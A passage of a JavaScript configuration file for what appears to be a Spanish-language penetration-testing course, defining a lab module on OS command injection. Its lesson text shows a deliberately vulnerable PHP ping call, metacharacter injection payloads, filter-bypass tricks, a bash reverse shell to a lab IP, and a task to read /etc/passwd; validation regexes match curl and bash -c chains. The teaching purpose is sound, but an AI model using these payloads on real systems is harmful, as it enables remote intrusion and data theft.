            expected_output_match: ["email", "subdomain", "google.com", "metadata"]
        }
    },
    'Command Injection': {
        id: 'MOD-014',
        title: 'OS Command Injection - Ejecución Remota de Comandos',
        description: 'Aprende a inyectar comandos de sistema operativo en aplicaciones web vulnerables.',
        difficulty: 'Intermedio',
        video_url: 'IuzU8yJNcCE', // PwnFunction - Command Injection
        lab_config: {
            target_ip: '10.10.10.65',
            target_os: 'Linux Ubuntu 18.04',
            open_ports: [80, 8080],
            vulnerabilities: ['Command Injection in Ping Utility', 'Shell Metacharacter Injection', 'RCE via system()']
        },
        theory_block: `
# FASE 14: OS COMMAND INJECTION (Inyección de Comandos del Sistema)

## 🧠 Concepto Clave: Hablar con el Sistema Operativo
Algunas aplicaciones web ejecutan comandos del sistema directamente (ping, nslookup, convert).
Si no validan la entrada del usuario, puedes **inyectar tus propios comandos**.

## 💣 El Ataque Típico
Aplicación web de "Network Tools":
\`\`\`
Introduce una IP para hacer ping: [_____]
\`\`\`

El código detrás puede ser:
\`\`\`php
<?php system("ping -c 4 " . $_GET['ip']); ?>
\`\`\`

Si introduces:
\`8.8.8.8; ls -la\`
El comando ejecutado será:
\`ping -c 4 8.8.8.8; ls -la\`

¡Acabas de listar los archivos del servidor!

## 🔗 Caracteres Mágicos (Shell Metacharacters)
- **;** → Ejecuta comandos secuencialmente
- **&&** → Ejecuta el segundo si el primero tuvo éxito
- **||** → Ejecuta el segundo si el primero falló
- **\`command\`** → Sustitución de comando
- **$(command)** → Sustitución de comando (sintaxis moderna)

## 🎯 Escalación a Reverse Shell
Una vez confirmas que tienes RCE, puedes:
\`\`\`bash
8.8.8.8; bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
\`\`\`
Esto te da una shell interactiva en tu máquina.

## 🛡️ Bypass de Filtros
Si bloquean \`;\`, prueba:
- **%0a** (newline URL encoded)
- **|** (pipe)
- **\`backticks\`**

## 🎯 TU MISIÓN
El formulario de "Network Diagnostic Tool" es vulnerable. Inyecta comandos para leer \`/etc/passwd\` o establecer una reverse shell.
        `,
        success_criteria: [
            "Identificar parámetro vulnerable a command injection",
            "Ejecutar comandos básicos (whoami, id, ls)",
            "Leer archivos sensibles del sistema",
            "Establecer una reverse shell"
        ],
        validation_rules: {
            allowed_commands: [
                /curl.*; .*/,
                /.*&&.*/,
                /.*\|\|.*/,
                /.*`.*`.*/,
                /.*bash.*-c.*/
            ],
            expected_output_match: ["uid=", "www-data", "etc/passwd", "reverse shell"]
        }
    }
};
